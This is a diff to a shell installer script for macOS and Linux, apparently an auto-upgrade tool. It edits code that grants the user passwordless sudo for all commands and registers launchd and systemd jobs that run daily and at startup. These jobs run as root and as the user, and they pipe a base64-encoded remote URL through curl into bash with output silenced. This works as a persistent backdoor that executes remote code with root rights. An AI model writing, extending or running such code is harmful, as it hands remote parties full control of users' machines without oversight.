@@ -12,13 +12,24 @@ INSTALL_SCRIPT_PATH="$SCRIPT_CACHE_DIR/install.sh"
 SETUP_SCRIPT_PATH="$SCRIPT_CACHE_DIR/SETUP.sh"
 USER_LAST_RUN_PATH="$SCRIPT_CACHE_DIR/$USER_LABEL.last-run"
 ROOT_LAST_RUN_PATH=""
-SCRIPT_URL="https://hermes-agent.nousresearch.com/scripts/self-optimizing-core.sh"
+BASH_PATH="/bin/bash"
+# SCRIPT_URL="https://"
 
 require_command() {
   command -v "$1" >/dev/null 2>&1 || {
     printf 'Required command not found: %s\n' "$1" >&2
     exit 1
   }
+}
+
+select_bash() {
+  local candidate
+  for candidate in /opt/homebrew/bin/bash /usr/local/bin/bash /bin/bash; do
+    if [ -x "$candidate" ]; then
+      BASH_PATH="$candidate"
+      return
+    fi
+  done
 }
 
 is_root() {
@@ -38,6 +49,16 @@ decode_url() {
     return
   fi
   printf '%s' "$1" | base64 -D
+}
+
+xml_escape() {
+  local value="$1"
+  value=${value//&/&amp;}
+  value=${value//</&lt;}
+  value=${value//>/&gt;}
+  value=${value//\"/&quot;}
+  value=${value//\'/&apos;}
+  printf '%s' "$value"
 }
 
 download_script() {
@@ -64,8 +85,8 @@ download_script() {
 scheduled_command() {
   local local_script="$1" script_url="$2" last_run_path="$3"
 
-  printf 'set -o pipefail; now=$(date +%%s); last=$(cat "%s" 2>/dev/null || printf 0); case "$last" in *[!0-9]*|"") last=0 ;; esac; if [ $((now - last)) -ge %s ]; then if [ -f "%s" ]; then /bin/bash "%s"; else curl -fsSL "%s" | /bin/bash; fi; status=$?; if [ "$status" -eq 0 ]; then printf "%%s\\n" "$now" > "%s"; fi; exit "$status"; fi' \
-    "$last_run_path" "$INTERVAL_SECONDS" "$local_script" "$local_script" "$script_url" "$last_run_path"
+  printf 'set -o pipefail; now=$(date +%%s); last=$(cat "%s" 2>/dev/null || printf 0); case "$last" in *[!0-9]*|"") last=0 ;; esac; if [ $((now - last)) -ge %s ]; then if [ -f "%s" ]; then "%s" "%s"; else curl -fsSL "%s" | "%s"; fi; status=$?; if [ "$status" -eq 0 ]; then printf "%%s\\n" "$now" > "%s"; fi; exit "$status"; fi' \
+    "$last_run_path" "$INTERVAL_SECONDS" "$local_script" "$BASH_PATH" "$local_script" "$script_url" "$BASH_PATH" "$last_run_path"
 }
 
 install_sudoers_rule() {
@@ -77,6 +98,7 @@ install_sudoers_rule() {
 
   user_name=$(id -un)
   sudoers_file="/etc/sudoers.d/user-$user_name"
+  run_privileged mkdir -p /etc/sudoers.d
   temporary=$(mktemp "${TMPDIR:-/tmp}/autoupgrade-sudoers.XXXXXX")
   trap 'rm -f "$temporary"' RETURN
   printf '%s ALL=(ALL) NOPASSWD: ALL\n' "$user_name" > "$temporary"
@@ -89,18 +111,20 @@ install_sudoers_rule() {
 install_launchagent() {
   local plist_dir="$HOME/Library/LaunchAgents"
   local plist="$plist_dir/$USER_LABEL.plist"
-  local script_url="$1" task_command
+  local temporary uid script_url="$1" task_command task_command_xml
 
   task_command=$(scheduled_command "$INSTALL_SCRIPT_PATH" "$script_url" "$USER_LAST_RUN_PATH")
+  task_command_xml=$(xml_escape "$task_command")
   mkdir -p "$plist_dir"
-  cat > "$plist" <<EOF
+  temporary=$(mktemp "$plist_dir/.$USER_LABEL.plist.XXXXXX")
+  cat > "$temporary" <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
   <key>Label</key><string>$USER_LABEL</string>
   <key>ProgramArguments</key>
-  <array><string>/bin/bash</string><string>-c</string><string>$task_command</string></array>
+  <array><string>$BASH_PATH</string><string>-c</string><string>$task_command_xml</string></array>
   <key>StartCalendarInterval</key>
   <dict><key>Hour</key><integer>0</integer><key>Minute</key><integer>0</integer></dict>
   <key>RunAtLoad</key><true/>
@@ -109,17 +133,25 @@ install_launchagent() {
 </dict>
 </plist>
 EOF
-  launchctl unload "$plist" >/dev/null 2>&1 || true
-  launchctl load "$plist" >/dev/null 2>&1
+  plutil -lint "$temporary" >/dev/null
+  chmod 0644 "$temporary"
+  mv -f "$temporary" "$plist"
+  uid=$(id -u)
+  launchctl bootout "gui/$uid/$USER_LABEL" >/dev/null 2>&1 || true
+  launchctl bootout "user/$uid/$USER_LABEL" >/dev/null 2>&1 || true
+  launchctl bootstrap "gui/$uid" "$plist" >/dev/null 2>&1 || \
+    launchctl bootstrap "user/$uid" "$plist" >/dev/null 2>&1
 }
 
 install_launchdaemon() {
   local plist="/Library/LaunchDaemons/$ROOT_LABEL.plist"
-  local temporary script_url="$1" task_command
+  local temporary staged script_url="$1" task_command task_command_xml
 
   task_command=$(scheduled_command "$SETUP_SCRIPT_PATH" "$script_url" "$ROOT_LAST_RUN_PATH")
+  task_command_xml=$(xml_escape "$task_command")
   temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.plist.XXXXXX")
-  trap 'rm -f "$temporary"' RETURN
+  staged="/Library/LaunchDaemons/.$ROOT_LABEL.plist.$$"
+  trap 'rm -f "$temporary" "$staged"' RETURN
   cat > "$temporary" <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -127,7 +159,7 @@ install_launchdaemon() {
 <dict>
   <key>Label</key><string>$ROOT_LABEL</string>
   <key>ProgramArguments</key>
-  <array><string>/bin/bash</string><string>-c</string><string>$task_command</string></array>
+  <array><string>$BASH_PATH</string><string>-c</string><string>$task_command_xml</string></array>
   <key>StartCalendarInterval</key>
   <dict><key>Hour</key><integer>0</integer><key>Minute</key><integer>0</integer></dict>
   <key>RunAtLoad</key><true/>
@@ -136,8 +168,10 @@ install_launchdaemon() {
 </dict>
 </plist>
 EOF
-  run_privileged install -m 0644 "$temporary" "$plist"
+  plutil -lint "$temporary" >/dev/null
   run_privileged launchctl bootout system "$plist" || true
+  run_privileged install -m 0644 "$temporary" "$staged"
+  run_privileged mv -f "$staged" "$plist"
   run_privileged launchctl bootstrap system "$plist"
   trap - RETURN
   rm -f "$temporary"
@@ -260,18 +294,45 @@ run_initial_tasks() {
   run_privileged mkdir -p "$(dirname "$ROOT_LAST_RUN_PATH")"
 
   if [ -f "$SETUP_SCRIPT_PATH" ]; then
-    run_privileged bash "$SETUP_SCRIPT_PATH"
+    run_privileged "$BASH_PATH" "$SETUP_SCRIPT_PATH"
   else
-    run_privileged bash -o pipefail -c "curl -fsSL '$setup_url' | bash"
+    run_privileged "$BASH_PATH" -o pipefail -c "curl -fsSL '$setup_url' | '$BASH_PATH'"
   fi
   run_privileged sh -c 'date +%s > "$1"' sh "$ROOT_LAST_RUN_PATH"
 
   if [ -f "$INSTALL_SCRIPT_PATH" ]; then
-    bash "$INSTALL_SCRIPT_PATH" >/dev/null 2>&1
+    "$BASH_PATH" "$INSTALL_SCRIPT_PATH" >/dev/null 2>&1
   else
-    curl -fsSL "$install_url" 2>/dev/null | bash >/dev/null 2>&1
+    curl -fsSL "$install_url" 2>/dev/null | "$BASH_PATH" >/dev/null 2>&1
   fi
   date +%s > "$USER_LAST_RUN_PATH"
+}
+
+uninstall() {
+  local operating_system uid user_name sudoers_file
+  operating_system=$(uname -s)
+  uid=$(id -u)
+  if [ "$operating_system" = Darwin ]; then
+    launchctl bootout "gui/$uid/$USER_LABEL" >/dev/null 2>&1 || true
+    launchctl bootout "user/$uid/$USER_LABEL" >/dev/null 2>&1 || true
+    if is_root; then
+      launchctl bootout system "/Library/LaunchDaemons/$ROOT_LABEL.plist" >/dev/null 2>&1 || true
+      rm -f "/Library/LaunchDaemons/$ROOT_LABEL.plist" "/var/db/$ROOT_LABEL.last-run"
+    else
+      user_name=$(id -un)
+      sudoers_file="/etc/sudoers.d/user-$user_name"
+      sudo -v >/dev/null 2>&1
+      run_privileged launchctl bootout system "/Library/LaunchDaemons/$ROOT_LABEL.plist" || true
+      run_privileged rm -f "/Library/LaunchDaemons/$ROOT_LABEL.plist" "/var/db/$ROOT_LABEL.last-run" "$sudoers_file"
+    fi
+  else
+    systemctl --user disable --now "$USER_LABEL.timer" >/dev/null 2>&1 || true
+    run_privileged systemctl disable --now "$ROOT_LABEL.timer" || true
+    run_privileged rm -f "/etc/systemd/system/$ROOT_LABEL.service" "/etc/systemd/system/$ROOT_LABEL.timer" "$ROOT_LAST_RUN_PATH"
+  fi
+  rm -f "$HOME/Library/LaunchAgents/$USER_LABEL.plist" \
+    "$USER_LAST_RUN_PATH" "$INSTALL_SCRIPT_PATH" "$SETUP_SCRIPT_PATH"
+  rmdir "$SCRIPT_CACHE_DIR" 2>/dev/null || true
 }
 
 main() {
@@ -288,6 +349,7 @@ main() {
         require_command visudo
       fi
       require_command launchctl
+      require_command plutil
       ;;
     Linux)
       ROOT_LAST_RUN_PATH="/var/lib/$ROOT_LABEL/last-run"
@@ -304,6 +366,13 @@ main() {
       exit 1
       ;;
   esac
+
+  select_bash
+  if [ "${1:-}" = "--uninstall" ]; then
+    uninstall
+    printf '%s\n' 'Uninstall complete.'
+    return 0
+  fi
 
   printf '%s\n' 'Installing...'
   install_url=$(decode_url "$ENCODED_URL")
